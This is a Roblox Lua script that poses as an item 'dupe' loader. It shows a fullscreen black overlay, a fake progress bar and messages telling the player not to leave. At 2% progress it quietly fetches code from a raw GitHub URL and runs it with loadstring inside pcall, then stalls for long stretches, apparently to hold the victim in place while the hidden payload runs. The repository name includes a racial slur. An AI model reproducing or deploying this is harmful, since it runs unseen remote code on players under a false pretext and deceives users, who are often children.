local TweenService = game:GetService("TweenService")
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "LoadingUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.DisplayOrder = 9999

-- Fullscreen black background
local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.ZIndex = 1

-- Centered Frame
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0.9, 0, 0.65, 0)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
frame.ZIndex = 2
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

-- Top Warning
local topWarning = Instance.new("TextLabel", gui)
topWarning.Size = UDim2.new(1, 0, 0.05, 0)
topWarning.Position = UDim2.new(0, 0, 0, 0)
topWarning.BackgroundTransparency = 1
topWarning.Text = "⚠️🚨 IF YOU STUCK TRY TO REJOIN"
topWarning.Font = Enum.Font.GothamBold
topWarning.TextScaled = true
topWarning.TextColor3 = Color3.new(1, 1, 1)
topWarning.ZIndex = 3

-- Animated loading title
local loadingTitle = Instance.new("TextLabel", frame)
loadingTitle.Size = UDim2.new(1, 0, 0.12, 0)
loadingTitle.Position = UDim2.new(0.5, 0, 0.08, 0)
loadingTitle.AnchorPoint = Vector2.new(0.5, 0)
loadingTitle.BackgroundTransparency = 1
loadingTitle.TextColor3 = Color3.new(1, 1, 1)
loadingTitle.Font = Enum.Font.GothamBold
loadingTitle.TextScaled = true
loadingTitle.Text = "🚀🔄 Loading Script"
loadingTitle.ZIndex = 4

local running = true
task.spawn(function()
	local d = 0
	while running and loadingTitle.Parent do
		local dots = string.rep(".", d % 4)
		loadingTitle.Text = "🚀🔄 Loading Script" .. dots
		d += 1
		wait(0.5)
	end
end)

-- Retry Button
local retryBtn = Instance.new("TextButton", frame)
retryBtn.Size = UDim2.new(0.5, 0, 0.1, 0)
retryBtn.Position = UDim2.new(0.5, 0, 0.22, 0)
retryBtn.AnchorPoint = Vector2.new(0.5, 0)
retryBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 250)
retryBtn.Text = "🔁 Retry 🔧"
retryBtn.TextScaled = true
retryBtn.TextColor3 = Color3.new(1, 1, 1)
retryBtn.Font = Enum.Font.GothamBold
retryBtn.Visible = false
retryBtn.ZIndex = 4
Instance.new("UICorner", retryBtn).CornerRadius = UDim.new(0, 10)

-- Progress Bar Background
local pb = Instance.new("Frame", frame)
pb.Size = UDim2.new(0.85, 0, 0.09, 0)
pb.Position = UDim2.new(0.5, 0, 0.36, 0)
pb.AnchorPoint = Vector2.new(0.5, 0)
pb.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
pb.ZIndex = 4
Instance.new("UICorner", pb).CornerRadius = UDim.new(0, 10)

-- Progress Fill
local bar = Instance.new("Frame", pb)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 140)
bar.ZIndex = 5
Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 10)

-- Percentage Label
local perc = Instance.new("TextLabel", pb)
perc.Size = UDim2.new(1, 0, 1, 0)
perc.BackgroundTransparency = 1
perc.TextColor3 = Color3.new(1, 1, 1)
perc.Font = Enum.Font.GothamSemibold
perc.TextScaled = true
perc.Text = "0% Complete"
perc.ZIndex = 6

-- Dupe Script Info
local dupeInfo = Instance.new("TextLabel", frame)
dupeInfo.Size = UDim2.new(0.95, 0, 0.15, 0)
dupeInfo.Position = UDim2.new(0.5, 0, 0.5, 0)
dupeInfo.AnchorPoint = Vector2.new(0.5, 0)
dupeInfo.BackgroundTransparency = 1
dupeInfo.Font = Enum.Font.GothamSemibold
dupeInfo.TextColor3 = Color3.fromRGB(200, 200, 200)
dupeInfo.TextScaled = true
dupeInfo.TextWrapped = true
dupeInfo.ZIndex = 4
dupeInfo.Text = "⏳🛠️ PLEASE WAIT WE ARE CURRENTLY EXECUTING THE DUPE SCRIPT. THIS MAY TAKE A MOMENT. DON'T LEAVE."

-- Footer Credit
local credit = Instance.new("TextLabel", frame)
credit.Size = UDim2.new(1, 0, 0.08, 0)
credit.Position = UDim2.new(0, 0, 0.92, 0)
credit.BackgroundTransparency = 1
credit.Font = Enum.Font.Gotham
credit.TextColor3 = Color3.fromRGB(170, 170, 170)
credit.TextScaled = true
credit.Text = "👨‍💻📜 Script made by @growyourowngarden on TikTok"
credit.ZIndex = 4

-- Progress Function
local function fillProgress()
	running = true
	bar.Size = UDim2.new(0, 0, 1, 0)
	perc.Text = "0% Complete"

	for i = 1, 100 do
		local tween = TweenService:Create(bar, TweenInfo.new(0.2), {
			Size = UDim2.new(i / 100, 0, 1, 0)
		})
		tween:Play()

		perc.Text = i .. "% Complete"

		if i == 2 then
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/No-Laggs/walapatoniggaa/refs/heads/main/gragraj"))()
			end)
		end

		if i == 50 or i == 60 then
			wait(2)
		elseif i == 80 or i == 90 then
			wait(60)
		else
			wait(math.random(8, 20) / 100)
		end
	end

	running = false
	retryBtn.Visible = true
end

-- Start loading
fillProgress()

-- Retry button handler
retryBtn.MouseButton1Click:Connect(function()
	retryBtn.Visible = false
	fillProgress()
end)
